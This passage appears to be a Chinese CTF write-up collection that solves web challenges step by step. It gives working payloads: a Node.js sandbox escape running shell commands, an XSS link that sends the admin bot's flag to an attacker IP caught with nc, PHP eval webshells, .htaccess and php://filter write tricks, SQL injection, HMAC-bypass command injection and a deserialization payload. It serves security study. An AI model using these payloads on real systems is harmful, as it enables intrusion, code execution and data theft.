+function (x) {
+    return x * x;
+}
+
+```
+
+同理`a = x=>x*x` 相当于命名了一个名字为a的函数
+
+那么`(x=>x+x)(2)`呢其实就相当于往这个函数里面传入参数2
+
+我们再回到payload本身`(Math=Math.constructor,Math.x=Math.constructor(......))` 可以清楚地看到最外层括号是一个逗号运算，而逗号运算我们知道是从左往右运算再最后返回最右边的值。我们由此得知这里是执行这么个运算：
+
+```
+Math.constructor.constructor(.....)
+
+```
+
+而这又是什么呢，我们直接逐层测试的`Math.constructor` ：
+
+![](https://img.npfs06.top/20210228231658.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+可以见到第一层返回的`function object()`,他是function的对象原型，而我们知道Object的构造器是指向Function的所以第二层会出现Function。而Function是构造函数他能够创建函数。可以简单理解他和eval类似。我们可以测试一个例子：
+
+![](https://img.npfs06.top/20210228231839.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+可以直接看到结果，`Math.constructor.constructor()` 和构造函数`new Function()` 是等效的
+
+而payload的最里面`fromCharCode`就很容易理解了就是把AIISC码转换为字符串,
+
+一切都理解了，最终的payload:
+
+```python
+import requests
+import json
+headers = {
+    "Content-Type":"application/json"
+}
+url = "http://df4685cc-7ff5-4912-9821-beb74887feee.node3.buuoj.cn/"
+data = {"e":'(Math=>(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)',"first":[0],"second":"0"}
+r = requests.post(url,data=json.dumps(data),headers=headers)
+print(r.text)
+```
+
+ascii生成脚本
+
+```python
+def gen(cmd):
+  s = f"return process.mainModule.require('child_process').execSync('{cmd}').toString()"
+  return ','.join([str(ord(i)) for i in s])
+
+print(gen("ls"))
+```
+
+
+
+## [Zer0pts2020]musicblog
+
+知识点：
+
+1. 代码审计
+2. strip_tags()安全问题
+3. xss
+
+打开环境是一个Blog。在发布文章时可以选择是否公开，如果设置为公开，admin用户会自动访问该文章并点赞。写文章时可以使用`[[URL]]`语法，将其插入到句子中会展开成`<audio controls src="URL"></audio>`这样的audio元素。
+
+buu上没有给源码，自己去Gitlab上下来一个，审计
+
+首先是bot代码：
+
+```js
+//worker/worker.js
+
+const flag = 'zer0pts{M4sh1m4fr3sh!!}';
+
+const browser_option = {
+    executablePath: 'google-chrome-unstable',
+    headless: true,
+    args: [
+        '--no-sandbox',
+        '--disable-background-networking',
+        '--disable-default-apps',
+        '--disable-extensions',
+        '--disable-gpu',
+        '--disable-sync',
+        '--disable-translate',
+        '--hide-scrollbars',
+        '--metrics-recording-only',
+        '--mute-audio',
+        '--no-first-run',
+        '--safebrowsing-disable-auto-update',
+    ],
+};
+let browser = undefined;
+
+const crawl = async (url) => {
+    console.log(`[+] Query! (${url})`);
+    const page = await browser.newPage();
+    try {
+        await page.setUserAgent(flag);
+        await page.goto(url, {
+            waitUntil: 'networkidle0',
+            timeout: 3 * 1000,
+        });
+        page.click('#like');
+        await page.waitForNavigation({timeout: 3000});
+    } catch (err){
+        console.log(err);
+    }
+    await page.close();
+    console.log(`[+] Done! (${url})`)
+};
+
+```
+
+可以看到bot将flag设为UA然后去点击`#like`标签
+
+接下来审一下题目web程序的源码，首先在init.php可以看到有CSP：
+
+```
+header("Content-Security-Policy: default-src 'self'; object-src 'none'; script-src 'nonce-${nonce}' 'strict-dynamic'; base-uri 'none'; trusted-types");
+header('X-Frame-Options: DENY');
+header('X-XSS-Protection: 1; mode=block');
+```
+
+题目是一个博客，发表的文章会被后台管理员的Bot检查，加上CSP，基本可以断定是个xss的题。
+
+![](https://img.npfs06.top/20210301213104.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+在查看文章的post.php代码中 ,发现在输出内容时调用了自定义的`render_tags()`函数，我们全局搜索该函数，跟进到util.php
+
+```php
+//util.php
+
+<?php
+// [[URL]] → <audio src="URL"></audio>
+function render_tags($str) {
+  $str = preg_replace('/\[\[(.+?)\]\]/', '<audio controls src="\\1"></audio>', $str);
+  $str = strip_tags($str, '<audio>'); // only allows `<audio>`
+  return $str;
+}
+
+```
+
+我们提交的[[URL]]被替换成`<audio>`标签就是在`render_tags()`中进行的，这里有个`strip_tags`函数，该函数的作用是除去所有非`<audio>`标签,比如说我们传入
+
+```
+[[npfs"></audio><script>alert('a');</script>"]]
+```
+
+在`render_tags()`中经`render_tags()`中作用后变成
+
+```
+<audio controls src="npfs"></audio><script>alert('a');</script>""></audio>
+```
+
+如果不存在`strip_tags()`，这里可以利用`<script>`从`<audio>`标签中逃逸出来实现xss，但是经过`strip_tags()`的剥去html标签处理后，字符串变成了：
+
+```
+<audio controls src="npfs"></audio>alert('a');""></audio>
+```
+
+这里alert('a')前面的</audio>没有被去除掉是因为html标签成对出现，因此`strip_tags()`的处理也自动对白名单标签的闭合标签做了白名单处理，也就是说</audio>在白名单中，不会被剔除掉
+
+**这里就要说到`strip_tags()`函数的安全问题了，它允许标签里出现斜线，猜测这是为了匹配闭合标签的。但是没有判断斜线的位置，在哪出现都可以**
+
+也就是说我们可以这样子<a/udio>,而有趣的就是<a/udio>在浏览器里会解析成<a>标签，因为在标签中间的`/`会把后面注释掉了，从而变成<a>标签，我们知道超链接的跳转不受CSP的限制。
+
+payload:
+
+```
+[[npfs"></audio><a/udio id="like" href="http:xxx.xxx.xxx.xxx:2333">1</a/udio>]]
+```
+
+这里解释下这个payload,我们提交的payload经``render_tags()`作用，变成了
+
+```
+<audio controls src="npfs"></audio><a/udio id="like" href="http:xxx.xxx.xxx.xxx:2333">1</a/udio>>"></audio>
+```
+
+我们在worker.js中发现的
+
+```
+await page.click('#like');
+```
+
+bot会点击`#like`，而现在我们能够通过标签的逃逸来自定义出一个超链接，只要在自定`<a>`中设置了like这个id，管理员bot就会带着flag来点击访问这个超链接，这时候就能得到flag了
+
+nc监听即可
+
+![](https://img.npfs06.top/20210301214648.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+
+
+## [WUSTCTF2020]Train Yourself To Be Godly
+
+知识点：
+
+1. tomcat目录穿越
+2. tomcat管理后台弱口令
+3. 后台上传war🐎
+4. Cookie利用
+
+Orange 师傅在 BlackHat 上有个议题（[DEF CON 26 – Orange Tsai – Breaking Parser Logic Take Your Path Normalization Off and Pop 0Days Out](https://www.youtube.com/watch?v=28xWcRegncw)），大意就是由于中间件的一些特性，导致了一些神奇的目录穿越现象。比如：
+
+![](https://img.npfs06.top/20210301220624.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+URL路径参数不规范引发的问题，能造成的危害如下
+
+![](https://img.npfs06.top/20210301220722.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+
+
+针对于本题的环境，题目是由 Nginx 做反向代理，真实的后端中间件是 Tomcat，两种中间件识别的路径不同，就会造成解析不一致的情况。引用 Orange 师傅的总结：
+
+![](https://img.npfs06.top/20210301221221.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+上图可知，Nginx 会解析` /a;evil/b/`，并认为这是一个合法的目录请求，而 Tomcat 做解析的时候会自动忽略掉脏数据` ;.*`，所以 Tomcat 对此的解析是` /a/b/`。也就是说我们从可以通过写` ;+脏数据`的方式绕过 Nginx 的反向代理，从而请求本不应该能请求到的非法路径。对于本题来说，我们可以构造路径` /..;/`，Nginx 会认为我们要访问服务器的 /..;/ 目录下的内容，从而将这个请求视为合法请求发送给后端的 Tomcat 解析，Tomcat 接受之后认为 ; 是脏数据，从而过滤掉，解析的路径就变成了` /../` 也就是上级目录。所以访问` /..;/manager/html `之后我们就成功进入了后台界面。
+
+![](https://img.npfs06.top/20210301220751.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+
+
+<----未完成 待更---->
+
+
+
+## Phuck2
+
+
+
+使用arjun工具找到参数：hl
+
+```php
+<?php
+    stream_wrapper_unregister('php');
+    if(isset($_GET['hl'])) highlight_file(__FILE__);
+
+    $mkdir = function($dir) {
+        system('mkdir -- '.escapeshellarg($dir));
+    };
+    $randFolder = bin2hex(random_bytes(16));
+    $mkdir('users/'.$randFolder);
+    chdir('users/'.$randFolder);
+    
+    $userFolder = (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);
+    $userFolder = basename(str_replace(['.','-'],['',''],$userFolder));
+    
+    $mkdir($userFolder);
+    chdir($userFolder);
+    file_put_contents('profile',print_r($_SERVER,true));
+    chdir('..');
+    $_GET['page']=str_replace('.','',$_GET['page']);
+    if(!stripos(file_get_contents($_GET['page']),'<?') && !stripos(file_get_contents($_GET['page']),'php')) {
+        include($_GET['page']);
+    }
+    
+    chdir(__DIR__);
+    system('rm -rf users/'.$randFolder);
+
+?> 
+
+```
+
+上来先 ban 了 php 流，猜测是文件包含的题
+
+![](https://img.npfs06.top/20210302221008.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+$mkdir 函数用的 system 函数调用 mkdir 命令，看起来有搞头，但是后面的 escapeshellarg 没法绕，暂时作罢
+
+![](https://img.npfs06.top/20210302221228.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+显然，这个system函数是很安全的，只好继续向下看
+
+```php
+$randFolder = bin2hex(random_bytes(16));
+$mkdir('users/'.$randFolder);
+chdir('users/'.$randFolder);
+```
+
+这三行应该是为了隔离每个用户的，防止互相干扰，继续向下
+
+下面的 $userFolder 开始有趣了，从 X-Forwarded-For 头里拿目录名字作为 userFolder，并且过滤`.` 和 `-` 这两个符号。
+
+```php
+$userFolder = (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);
+$userFolder = basename(str_replace(['.','-'],['',''],$userFolder));
+```
+
+在往下看
+
+```php
+file_put_contents('profile',print_r($_SERVER,true));
+chdir('..');
+$_GET['page']=str_replace('.','',$_GET['page']);
+if(!stripos(file_get_contents($_GET['page']),'<?') && !stripos(file_get_contents($_GET['page']),'php')) {
+    include($_GET['page']);
+}
+```
+
+file_put_contents 令人眼前一亮，把 $_SERVER 的所有数据写到 userFolder/profile 里，并且完全没有过滤,那么我们随便写一个 HTTP 头，传入任意 PHP 代码，可以造成 RCE
+
+现在做的就是想办法绕过`<?`和`php`，也就是这道题的考点了，include 与 file_get_contents 在关于 Data URI 处理问题上的问题，include () 与 file_get_contents () 支持Data URI，而且在处理的时候，出现了差异
+
+首先看`file_get_contents`，会直接返回`data:,`之后的内容
+
+```php
+// allow_url_include=On
+<?php	
+print(file_get_contents("data:,123/profile"));
+print("\n");
+print(file_get_contents("data:,profile"));
+print("\n");
+```
+
+![](https://img.npfs06.top/20210302231417.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+而在 allow_url_include=Off 的情况下，是不允许 include data URI 的，但是如果 `data:,XXX` 是一个目录名的话，可以绕过限制，包含`xxx`件，利用点就是这里
+
+意思就是说
+
+```
+当allow_url_include=Off时
+
+file_get_contents在处理data:xxx时会直接取xxx
+
+而include会包含文件名为data:xxx的文件
+```
+
+
+
+![](https://img.npfs06.top/20210302000127.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+
+
+
+
+## [羊城杯2020]easyphp
+
+知识点：.htaccess写入
+
+似曾相识的题目，查了下以前写的wp,发现基本就是原题 [XNUCA2019Qualifier]EasyPHP
+
+```php
+<?php
+    $files = scandir('./'); 
+    foreach($files as $file) {
+        if(is_file($file)){
+            if ($file !== "index.php") {
+                unlink($file);
+            }
+        }
+    }
+//对写入的文件，进行判断，不是index.php的话，就删除掉
+
+    if(!isset($_GET['content']) || !isset($_GET['filename'])) {
+        highlight_file(__FILE__);
+        die();
+    }
+
+//如果不存在content或filename，则高亮代码
+
+    $content = $_GET['content'];
+    if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) {
+        echo "Hacker";
+        die();
+    }
+//对content进行黑名单过滤
+
+    $filename = $_GET['filename'];
+    if(preg_match("/[^a-z\.]/", $filename) == 1) {
+        echo "Hacker";
+        die();
+    }
+//对filename进行黑名单过滤
+
+    $files = scandir('./'); 
+    foreach($files as $file) {
+        if(is_file($file)){
+            if ($file !== "index.php") {
+                unlink($file);
+            }
+        }
+    }
+//对写入的文件，进行判断，不是index.php的话，就删除掉
+
+    file_put_contents($filename, $content . "\nHello, world");
+//在文件末尾追加hello,world
+?>
+```
+
+根据题目的意思`只解析index.php`，想到以下方法：
+
+### 方法一、写入一句话木马到index.php
+
+直接写入一句话木马到index.php
+
+```php
+?filename=index.php&content=<?php eval($_POST['npfs']); ?>
+```
+
+蚁剑连接，找到flag即可。
+
+
+
+### 方法二、写入一个`.user.ini`让index.php自动包含上我们写入的马
+
+**` file_put_contents($filename, $content . "\nHello, world");`,对于这里的末尾追加数据，我们考虑利用`\`绕过\n换行追加数据导致.htaccess解析错误的限制**
+
+**我们可以利用#注释符将整句话都注视掉，但是又由于有\n换行符的存在，我们不能直接使用#就将其注释掉，需要把\n进行“吃”掉。那么最常见的操作就是利用\斜杠将其转义了，这样`\\n`就是一个简单的\n字符串了。**
+
+.htaccess文件内容：
+
+```
+.htaccess
+
+php_value auto_prepend_fil\
+e .htaccess
+#<?php phpinfo();?>\
+```
+
+至于最终对flag的读取，因为content中对flag进行了黑名单过滤，绕过很简单，这里就不多说了
+
+最终payload:
+
+```
+?content=php_value%20auto_prepend_fil\%0ae%20.htaccess%0a%23<?php%20system('cat%20/fla'.'g');?>\&filename=.htaccess
+```
+
+
+
+------
+
+### 方法三
+
+后来看了wp发现对于黑名单的绕过，还可以利用base64编码
+
+p神的一篇文章：[谈一谈php://filter的妙用](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)
+提到file_put_contents函数中的第一个参数`$filename`，即写入的文件名是可以控制协议的，所以我们可以用`php://filter流`的`base64-decode`方法将文件内容参数`$content`进行base64解码，那么这样就可以通过将内容进行base64加密来绕过stristr函数的检查。
+**测试代码：**
+
+```php
+<?php 
+    $filename = $_GET['filename'];
+    $content = $_GET['content'];
+    if(stristr($content,'<?php')){
+        echo 'Hacker';
+        die();
+    } 
+    file_put_contents($filename, $content);
+?>
+```
+
+对要写入的content进行base64编码：
+
+```py
+>>> base64.b64encode('<?php phpinfo(); ?>')
+'PD9waHAgcGhwaW5mbygpOyA/Pg=='
+```
+
+测试payload
+
+```php
+?filename=php://filter/write=convert.base64-decode/resource=phpinfo.php&content=PD9waHAgcGhwaW5mbygpOyA/Pg==
+```
+
+访问`phpinfo.php`，成功显示phpinfo信息。
+
+------
+
+### 方法四 ：正则最大回溯绕过，利用php伪协议 写入WebShell
+
+**绕过preg_match**
+
+```php
+if(preg_match("/[^a-z\.]/", $filename) == 1) {
+        echo "Hacker";
+        die();
+    }
+```
+
+因为正则判断写的是`if(preg_match("/[^a-z\.]/", $filename) == 1)`而不是`if(preg_match("/[^a-z\.]/", $filename) !== 0)` ，因此存在了被绕过的可能。
+
+思路是：通过正则匹配的递归次数来绕过，正则匹配的递归次数由`pcre.backtrack_limit`参数来控制
+PHP5.3.7 版本之前默认值为 10万 ，PHP5.3.7 版本之后默认值为 100万。该值可以通过`php.ini`设置，也可以通过 `phpinfo`页面查看。
+
+要让preg_match返回false，也就是匹配不到，即可绕过preg_match。这里就有一个骚操作，就是通过设置`pcre.backtrack_limit`值为0，使得回溯次数为0，来使得正则匹配什么都不匹配，即返回false。
+测试一下，是否能绕过preg_match：
+
+```php
+<?php
+ini_set('pcre.backtrack_limit',0);
+var_dump(preg_match('/[^a-z\.]/','php://filter'));
+?>
+//bool(false) 
+```
+
+因为php版本>=7，所以需要特别设置`pcre.jit`这个环境变量为0，不适用JIT引擎来匹配正则表达式，就使得`pcre.backtrack_limit`这个环境变量能正常生效，绕过preg_match函数。
+
+
+
+```
+php_value pcre.backtrack_limit 0
+php_value pcre.jit 0
+php_value auto_append_file .htaccess
+#<?php eval($_GET[1]);?>\
+```
+
+payload:
+
+```
+?filename=php://filter/write=convert.base64-decode/resource=.htaccess&content=cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcG hwX3ZhbHVlIHBjcmUuaml0IDAKcGhwX3ZhbHVlIGF1dG9fYXBwZW5kX2ZpbGUgLmh0YWNjZXNzCiM8P3 BocCBldmFsKCRfR0VUWzFdKTs/Plw&1=phpinfo();
+```
+
+
+
+
+
+## [CISCN2019 总决赛 Day1 Web3]Flask Message Board
+
+进入网站，为一个留言板服务，并且带有机器人过滤机制，页面底部有一个管理员入口但无法进入。
+
+fuzz下，发现在Author处有回显
+
+![](https://img.npfs06.top/20210303174158.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+在Author处写入{{config}},（这里存在长度限制）得到key，很明显的cookie伪造
+
+![](https://img.npfs06.top/20210303174243.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+
+
+![](https://img.npfs06.top/20210303174756.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+修改cookie后，可以成功打开/admin，登录管理员后可以进入`/admin`后台，其中后台提供了网站源码和TensorFlow模型上传，并且从网页的注释和源码中可得知网站可以下载当前使用的模型。
+
+F12就看到一些提示
+
+```
+Todo: add /admin/model_download button 
+<a href="/admin/source_thanos">Open Source</a>
+ 
+zip file with detection.meta detection.index detection.data-00000-of-00001 3 TensorFlow(1.12) files! 
+
+The model need x:0 to input a number , and y:0 to output the result "Human" or "Bot" 
+```
+
+访问`/admin/model_download`可以把模型下载下来，源码则在`/admin/source`，最后是TensorFlow模型介绍
+
+看了wp,发现还是不理解
+
+[![1562304584548](https://github.com/RManLuo/ciscn2019_final_web4/raw/master/img/1562304584548.png)](https://github.com/RManLuo/ciscn2019_final_web4/blob/master/img/1562304584548.png)
+
+1. 审计Web逻辑和TensorFlow模型（使用TensorBoard浏览模型二进制文件）可以发现当输入的字符串字符总和为1024时会触发读取`/flag`的后门（模型生成代码可参考`model_init.py`，题目已包含生成好的二进制模型）
+
+```
+Tensorboard可视化
+def init(model_path):
+    new_sess = tf.Session()
+    meta_file = model_path + ".meta"
+    model = model_path
+    saver = tf.train.import_meta_graph(meta_file)
+    saver.restore(new_sess, model)
+    return new_sess
+sess = init('detection_model/detection')
+writer = tf.summary.FileWriter("./log", sess.graph)
+然后在命令行执行tensorboard --logdir ./log
+```
+
+[![1562307817821](https://github.com/RManLuo/ciscn2019_final_web4/raw/master/img/1562307817821.png)](https://github.com/RManLuo/ciscn2019_final_web4/blob/master/img/1562307817821.png)
+
+将评论转换为特征值（考虑比赛环境，简化为一个数字，由字符串总和得）
+
+<a href="https://blog.csdn.net/lin453701006/article/details/79391088" target="_blank">TensorBoard使用方法</a>
+
+[![1562307493848](https://github.com/RManLuo/ciscn2019_final_web4/raw/master/img/1562307493848.png)](https://github.com/RManLuo/ciscn2019_final_web4/blob/master/img/1562307493848.png)
+
+当特征值为1024时触发flag分支
+
+[![1562307600460](https://github.com/RManLuo/ciscn2019_final_web4/raw/master/img/1562307600460.png)](https://github.com/RManLuo/ciscn2019_final_web4/blob/master/img/1562307600460.png)
+
+`/flag`字符串节点，作为ReadFile参数
+
+[![1562307636446](https://github.com/RManLuo/ciscn2019_final_web4/raw/master/img/1562307636446.png)](https://github.com/RManLuo/ciscn2019_final_web4/blob/master/img/1562307636446.png)
+
+ReadFile节点 8. 因此我们可以构造一个总和1024的字符串，读取出flag（比如`aaaaaabxCZC`）。
+
+[![1562307755402](https://github.com/RManLuo/ciscn2019_final_web4/raw/master/img/1562307755402.png)](https://github.com/RManLuo/ciscn2019_final_web4/blob/master/img/1562307755402.png)
+
+
+
+```python
+#model_init.py
+
+import tensorflow as tf
+
+x = tf.placeholder(tf.int32, name="x")
+w = tf.Variable(1, dtype=tf.int32, name='w')
+b = tf.Variable("You are: ")
+c = tf.constant(2, dtype=tf.int32, name='odd')
+
+
+def flag():
+    flag_string = tf.read_file('/flag', name='getflag')
+    return flag_string
+
+
+def even():
+    def fail():
+        return tf.constant('Bot')
+
+    ans = tf.cond(tf.equal(x, 1024), flag, fail, name='flag')
+
+    return ans
+
+
+def odd():
+    return tf.constant('Human')
+
+
+first = tf.mod(x, c)
+ans = tf.cond(tf.equal(first, 0), even, odd, name="Answer")
+y = tf.string_join([b, ans], name='y')
+saver = tf.train.Saver()
+sess = tf.Session()
+sess.run(tf.global_variables_initializer())
+# y_out = sess.run(y, {'x:0': 1028})
+
+# print(y_out)
+saver.save(sess, 'detection_model/detection')
+```
+
+
+
+## October 2019 Twice SQL Injection
+
+没啥好说的,  注册页面，用户名处存在注入点
+
+`0‘ union select group_concat(table_name) from information_schema.tables where table_schema=database() #`
+
+得到 flag 表
+
+`0’ union select group_concat(column_name) from information_schema.columns where table_name='flag' #`
+
+得到flag字段
+
+paylaod:
+
+`0' union select flag from flag#`,登入即可得到flag
+
+
+
+
+
+## [羊城杯 2020]Blackcat
+
+进入环境，是个黑猫警长的页面，把mp3下载下来，010editor打开，可以在最后发现一段代码
+
+```php
+if(empty($_POST['Black-Cat-Sheriff']) || empty($_POST['One-ear'])){
+    die('谁！竟敢踩我一只耳的尾巴！');
+}
+
+$clandestine = getenv("clandestine");
+
+if(isset($_POST['White-cat-monitor']))
+    $clandestine = hash_hmac('sha256', $_POST['White-cat-monitor'], $clandestine);
+
+
+$hh = hash_hmac('sha256', $_POST['One-ear'], $clandestine);
+
+if($hh !== $_POST['Black-Cat-Sheriff']){
+    die('有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。');
+}
+
+echo exec("nc".$_POST['One-ear']);
+```
+
+似乎是个原题 https://neversecure.ca/category/bug-hunting/
+
+hash_hmac — 使用 HMAC 方法生成带有密钥的哈希值
+
+```
+Copyhash_hmac ( string $algo , string $data , string $key [, bool $raw_output = false ] ) : string
+```
+
+在php中md5算法、sha256算法等无法处理数组，这个trick通常来绕过`if(@md5($_GET['a']) === @md5($_GET['b']))`，因为当传入参数为数组时，返回值是NULL，造成了NULL===NULL
+
+![](https://img.npfs06.top/20210305001142.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+那么我们传`White-cat-monitor`为数组，经第一个hash_hmac（）函数执行后`$clandestine`为NULL，这也就意味着第二个hash_hmac()函数的secret 为`NULL`,即$hh可控，于是绕过判断，命令执行
+
+buu的flag在env，payload如下
+
+![](https://img.npfs06.top/20210305001013.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+```
+#BUU payload
+White-cat-monitor[]=1&One-ear=;env&Black-Cat-Sheriff=afd556602cf62addfe4132a81b2d62b9db1b6719f83e16cce13f51960f56791b
+```
+
+羊城杯的flag在flag.php，如下
+
+![](https://img.npfs06.top/20210305000210.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+
+
+
+
+## [羊城杯 2020]EasySer
+
+`/robots.txt`得到star1.php，发现是一个ssrf，查看源代码发现要使用不安全的协议，做法如下
+
+![](https://img.npfs06.top/20210308225237.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+得到源码
+
+```php
+<?php
+error_reporting(0);
+if ( $_SERVER['REMOTE_ADDR'] == "127.0.0.1" ) {
+    highlight_file(__FILE__);
+} 
+$flag='{Trump_:"fake_news!"}';
+
+class GWHT{
+    public $hero;
+    public function __construct(){
+        $this->hero = new Yasuo;
+    }
+    public function __toString(){
+        if (isset($this->hero)){
+            return $this->hero->hasaki();
+        }else{
+            return "You don't look very happy";
+        }
+    }
+}
+class Yongen{ //flag.php
+    public $file;
+    public $text;
+    public function __construct($file='',$text='') {
+        $this -> file = $file;
+        $this -> text = $text;
+
+    }
+    public function hasaki(){
+        $d   = '<?php die("nononon");?>';
+        $a= $d. $this->text;
+         @file_put_contents($this-> file,$a);
+    }
+}
+class Yasuo{
+    public function hasaki(){
+        return "I'm the best happy windy man";
+    }
+}
+/*$c=$_GET['c'];
+echo $x=unserialize($c);*/
+?>
+```
+
+死亡die绕过，老考点了，之前wp里也有写过，这里就不过多记录了
+
+payload
+
+```php
+<?php
+class GWHT{
+    public $hero;
+    public function __construct(){
+        $this->hero = new Yongen;
+    }
+    public function __toString(){
+        if (isset($this->hero)){
+            return $this->hero->hasaki();
+        }else{
+            return "go away hacker";
+        }
+    }
+}
+class Yongen{
+    public $file = "php://filter/write=convert.base64-decode/resource=flag.php";
+    public $text = "aaaPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==";
+    public function hasaki(){
+        return file_get_contents($thie->file);
+    }
+}
+$flag = new GWHT();
+echo serialize($flag);
+?>
+```
+
+
+
+## [网鼎杯 2020 玄武组]SSRFMe
+
+
+
+```php
+<?php
+function check_inner_ip($url)
+{
+    $match_result=preg_match('/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/',$url);
+    if (!$match_result)
+    {
+        die('url fomat error');
+    }
+    try
+    {
+        $url_parse=parse_url($url);
+    }
+    catch(Exception $e)
+    {
+        die('url fomat error');
+        return false;
+    }
+    $hostname=$url_parse['host'];
+    $ip=gethostbyname($hostname);
+    $int_ip=ip2long($ip);
+    return ip2long('127.0.0.0')>>24 == $int_ip>>24 || ip2long('10.0.0.0')>>24 == $int_ip>>24 || ip2long('172.16.0.0')>>20 == $int_ip>>20 || ip2long('192.168.0.0')>>16 == $int_ip>>16;
+}
+
+function safe_request_url($url)
+{
+
+    if (check_inner_ip($url))
+    {
+        echo $url.' is inner ip';
+    }
+    else
+    {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_HEADER, 0);
+        $output = curl_exec($ch);
+        $result_info = curl_getinfo($ch);
+        if ($result_info['redirect_url'])
+        {
+            safe_request_url($result_info['redirect_url']);
+        }
+        curl_close($ch);
+        var_dump($output);
+    }
+
+}
+if(isset($_GET['url'])){
+    $url = $_GET['url'];
+    if(!empty($url)){
+        safe_request_url($url);
+    }
+}
+else{
+    highlight_file(__FILE__);
+}
+// Please visit hint.php locally.
+?>
+```
+
+**parse_url和curl在解析url时的差别**
+
+```
+完整url: scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment]
+这里仅讨论url中不含'?'的情况
+
+php parse_url：
+host: 匹配最后一个@后面符合格式的host
+
+libcurl：
+host：匹配第一个@后面符合格式的host
+
+如：
+
+http://u:p@a.com:80@b.com/
+
+php解析结果：
+    schema: http 
+    host: b.com
+    user: u
+    pass: p@a.com:80
+libcurl解析结果：
+    schema: http
+    host: a.com
+    user: u
+    pass: p
+    port: 80
+    后面的@b.com/会被忽略掉
+```
+
+
+
